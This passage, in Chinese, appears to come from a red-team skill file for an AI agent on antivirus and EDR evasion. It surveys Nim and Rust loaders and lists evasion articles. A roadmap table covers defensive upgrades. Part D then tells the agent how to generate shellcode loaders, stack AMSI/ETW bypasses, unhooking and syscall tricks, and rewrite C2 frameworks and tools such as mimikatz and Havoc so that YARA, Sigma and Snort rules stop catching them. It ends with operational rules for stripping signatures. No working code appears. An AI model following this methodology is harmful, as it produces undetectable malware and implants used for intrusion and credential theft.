- **Nim**：编译为 C 中间码再静态链接 → 单文件、无运行时依赖、字符串/导入表可高度定制，静态特征与常见 C#/Go loader 不同，是近年 loader/C2 常用语言。代价：生态较新、成品体积大、需自行封装 syscall/injection 原语。
- **Rust**：内存安全 + 零成本抽象，产单二进制，适合「审计+验证」类工具（adhammer 走 PingCastle 级 AD 审计 + RBCD/Shadow Credentials PKINIT 验证路线）；检测避让方面 Rust 成品同样可用 syscall/间接 syscall 技术。
- **检测避让要点**：Nim/Rust 成品仍会被「行为检测」（进程注入/内存扫描/异常 syscall 栈）命中，语言本身不免疫 EDR——价值在于**改变静态特征**，需叠加 Sleep Obfuscation/间接 syscall 等动态规避技术。

### C.8 中文社区精华参考

| 来源 | 标题 | 关键内容 | 日期 |
|------|------|----------|------|
| FreeBuf | C2木马免杀与通信隐匿 | AV/EDR/云沙箱三重检测绕过综合指南；87%高级攻击使用规避技术 | 2025-06 |
| FreeBuf | PowerShell的AMSI和ETW绕过 | AMSI与ETW绕过最新技术 | 2025-08 |
| FreeBuf | PuppetMaster: 无感Bypass卡巴EDR+NDR+KATA | Linux C2绕过三重防护 | 2025-08 |
| FreeBuf | SilentButDeadly: 阻断EDR/AV网络通信 | 新型EDR通信阻断工具 | 2025-11 |
| FreeBuf | GoPhantom: 红队专用荷载加载器 | AES-256-GCM加密shellcode加载器 | 2025-09 |
| FreeBuf | 免杀基础篇 | AV/EDR架构分析与规避基础（攻击者视角） | 2026-05 |
| FreeBuf | Windows Defender BlueHammer到RedSun | CVE-2026-33825零日分析（Defender签名更新TOCTOU） | 2026-04 |
| 先知 | Cronos高级睡眠混淆技术 | 高级sleep obfuscation详解 | 2025-05 |
| 先知 | 动态逃逸杀软的艺术 | 间接syscall+反调试+反沙箱组合 | 2024-12 |
| 先知 | Elastic EDR规则检测下的对抗 | 对抗Elastic EDR栈检测规则 | 2025-06 |
| 先知 | EDR对抗之内存合法性检查规避 | Phantom Hollowing改进版 | 2025-08 |
| 先知 | 深入SleepObfs的检测与绕过 | Sleep混淆检测与绕过深入分析 | 2025-09 |
| 奇安信 | CS shellcode免杀实践 | Cobalt Strike shellcode免杀自定义加载器 | 2025-10 |
| 奇安信 | 红队工具化: frp静态特征消除及流量改造 | FRP隧道代理特征消除+流量改造 | 2026-02 |

### C.9 防御升级路线图（P0-P3分级）

| 优先级 | 措施 | 对抗目标 | 实施复杂度 |
|--------|------|----------|------------|
| **P0** | 启用 HVCI + Vulnerable Driver Blocklist | BYOVD/EDR Kill | 中 |
| **P0** | 部署 NDR 补充 EDR（网络层独立检测） | ETW Patch/Session Kill | 高 |
| **P0** | 补丁CVE-2026-33825（Windows Defender签名更新TOCTOU） | 本地提权 | 低 |
| **P1** | 启用 Credential Guard + Token Protection | 凭证窃取横向移动 | 中 |
| **P1** | 部署 Tetragon eBPF 内核级监控（覆盖io_uring/AF_ALG） | 内核级rootkit | 高 |
| **P1** | 调试寄存器监控（DR0-DR7异常） | Hardware Breakpoint AMSI绕过 | 高 |
| **P1** | macOS 26.2+ 升级（entitlement-based TCC验证） | CVE-2025-43530 TCC绕过 | 中 |
| **P2** | 内存扫描频率提升 + Sleep Obfuscation检测规则 | Foliage/Moonwalk++ | 中 |
| **P2** | 调用栈完整性验证 | Call Stack Spoofing | 高 |
| **P2** | 本地日志+离线检测能力 | SilentButDeadly网络阻断 | 中 |
| **P2** | EDR安装/卸载额外认证 | BYOI攻击 | 低 |
| **P3** | LLM API调用检测 + 高熵区域分析 | AI/LLM嵌入式恶意软件 | 中 |
| **P3** | 苹果 Hardened Runtime 强制 | DYLD注入 | 低 |
| **P3** | Linux CrackArmor 补丁（AppArmor 9个CVE） | 容器隔离绕过 | 中 |

---

## Part D：工程化能力（v2 新增，源自 Evasion-SubAgents 整合）

> 上述 Part A-C 偏**技术原理与防御检测**。Part D 提供**工程化操作能力**：
> - 生成可用的 shellcode loader（C/C++/Rust）
> - 修改开源 C2/工具源码实现免杀
> - 系统化构建本地 evasion 知识库

### D.1 Shellcode Loader 工程化生成

任何 Windows shellcode loader 可分解为 **4 个正交组件**，组合产生大量变体：

| 组件 | 数量 | 示例 |
|------|------|------|
| storage（shellcode 嵌入方式） | 15 | embedded / 资源段 / 加密外部文件 |
| allocator（内存申请） | 14 | VirtualAlloc / HeapCreate / NtAllocateVirtualMemory |
| copier（写入内存） | 9 | memcpy / RtlMoveMemory / SSE2 |
| executor（执行跳转） | 47 | 函数指针 / CreateThread / Callback / APC / Fiber |

**详细工作流 + C/C++/Rust 模板**：见 av-evasion 预设 refs/techniques/loader-engineering.md（跨模式技能加载，见 ecosystem-cooperation）

**实际技术数据库**（172 项 evasion + 85 组件 + 25 场景）：见 av-evasion 预设 refs/techniques/kb/ 三份 JSON（跨模式技能加载，见 ecosystem-cooperation）

### D.2 Evasion 二开（在已有 loader 上叠加技术）

7 大类 evasion 技术（共 172 项已分类）：

| Type | 用途 | 复杂度 |
|------|------|--------|
| `api_obfuscation` | 隐藏 API 导入（hash/PEB walk） | medium |
| `string_obfuscation` | 字符串加密 | simple |
| `memory_evasion` | 避免 RWX 页面 | simple |
| `execution_evasion` | 绕过 hook（syscall） | complex |
| `anti_analysis` | 检测调试器/VM | medium |
| `amsi_etw_bypass` | 禁用 AMSI/ETW | medium |
| `unhooking` | 恢复被 hook 的 ntdll | complex |

**详细集成模式 + 兼容性矩阵**：见 `loader-engineering.md`

### D.3 C2 框架源码级免杀

针对开源 C2（Havoc/Sliver/Covenant/Mythic 等）：

1. **优先级框架**：Implant/Beacon > 网络暴露 > Server 内部字符串
2. **检测规则搜集**：YARA / Sigma / Snort 三类
3. **逐规则分析**：每条规则都要有 evasion 计划
4. **修改优先级**：编译器 flags → 构建配置 → 源码改动 → 函数重命名

**详细工作流 + 各 C2 框架关键检测点**：见 av-evasion 预设 refs/techniques/c2-source-evasion.md（跨模式技能加载，见 ecosystem-cooperation）

### D.4 渗透工具源码级免杀

针对开源工具（fscan/nuclei/mimikatz/sliver 等）：

| 工具类别 | 代表 | 主要检测点 |
|---------|------|-----------|
| 网络扫描 | nmap / masscan / zmap | 端口序列、TCP fingerprint |
| Web 扫描 | nuclei / xray / goby | UA、payload 模板特征 |
| 综合扫描 | fscan / kscan / laser | 字符串 banner、内置 PoC |
| 凭据工具 | mimikatz / sharphound / rubeus | lsass 访问、命令参数 |
| 横向移动 | smbexec / wmiexec / atexec | 命令执行模式、临时文件 |
| 代理隧道 | frp / nps / reGeorg | 协议特征、心跳模式 |

**详细工作流 + 各语言编译参数**：见 av-evasion 预设 refs/techniques/tools-source-evasion.md（跨模式技能加载，见 ecosystem-cooperation）

### D.5 GitHub 研究 + 知识库构建

系统化从 GitHub 搜 evasion/loader/C2 新技术，去重后保存到本地知识库：

1. **GitHub 搜索**（用 `gh` CLI）：广 → 窄
2. **仓库分析**：README / commit / stars
3. **模式提取**：按 7 大类分类
4. **去重检查**（避免知识库膨胀）
5. **存储到 JSON 知识库**

**详细工作流 + 去重决策表**：见 av-evasion 预设 refs/techniques/evasion-research-kb.md（跨模式技能加载，见 ecosystem-cooperation）

### D.6 关键规则（工程化任务通用）

1. **优先编译器 flags**（`-O2 -fno-stack-protector -fno-ident -Wl,--build-id=none`），其次源码
2. **优先消除 RWX**（最强 EDR 信号），再考虑 syscall
3. **永远不执行**生成的二进制（编译成功即视为完成）
4. **每条检测规则都要有分析**（绝不跳过）
5. **保留工具/C2 核心功能**（evasion 不能破坏功能）
6. **所有改动都要记录原因**（追溯审计）

